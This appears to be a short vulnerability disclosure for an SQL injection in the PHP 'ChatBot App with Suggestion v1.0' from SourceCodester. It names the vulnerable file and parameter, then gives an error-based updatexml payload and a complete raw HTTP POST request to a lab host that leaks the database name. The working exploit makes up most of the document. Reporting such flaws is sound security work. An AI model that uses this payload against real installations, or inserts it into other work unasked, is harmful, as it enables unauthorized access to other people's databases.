# ChatBot App with Suggestion v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15316/chatbot-app-suggestion-phpoop-free-source-code.html

Vulnerability File: /simple_chat_bot/classes/Master.php?f=delete_response

Vulnerability location: /simple_chat_bot/classes/Master.php?f=delete_response, id

[+] Payload: id=8' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id

```sql
POST /simple_chat_bot/classes/Master.php?f=delete_response HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/simple_chat_bot/admin/?page=responses
Content-Length: 65
Cookie: PHPSESSID=qq2e8htekg3g2rkgtbq38p0jnv
Connection: close

id=8' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
```

![image](https://user-images.githubusercontent.com/54017627/170820027-64477459-2dfa-4bd1-a6ed-d46c33f5632c.png)
